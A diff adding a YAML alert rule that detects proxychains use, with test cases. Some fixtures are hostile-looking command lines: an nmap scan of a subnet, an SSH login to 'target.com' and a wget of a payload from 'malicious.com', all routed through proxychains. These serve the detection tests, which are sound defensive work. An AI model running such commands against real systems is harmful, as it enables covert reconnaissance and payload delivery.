@@ -1,0 +1,34 @@
+name: elastic_proxychains_activity
+mode: alert
+eval: |
+  (
+    e.process_name == "proxychains" ||
+    e.process_name == "proxychains4" ||
+    e.process_name == "proxychains-ng" ||
+    e.process_args.contains("proxychains")
+  )
+tests:
+  - cleartext: "proxychains nmap -sT 192.168.1.0/24"
+    process_name: proxychains
+    process_args: "proxychains nmap -sT 192.168.1.0/24"
+    should_match: true
+  - cleartext: "proxychains4 ssh user@target.com"
+    process_name: proxychains4
+    process_args: "proxychains4 ssh user@target.com"
+    should_match: true
+  - cleartext: "proxychains-ng curl http://internal.target"
+    process_name: proxychains-ng
+    process_args: "proxychains-ng curl http://internal.target"
+    should_match: true
+  - cleartext: "/usr/bin/proxychains wget http://malicious.com/payload"
+    process_name: bash
+    process_args: "/usr/bin/proxychains wget http://malicious.com/payload"
+    should_match: true
+  - cleartext: "ssh -D 1080 user@jumphost"
+    process_name: ssh
+    process_args: "ssh -D 1080 user@jumphost"
+    should_match: false
+  - cleartext: "curl http://example.com"
+    process_name: curl
+    process_args: "curl http://example.com"
+    should_match: false
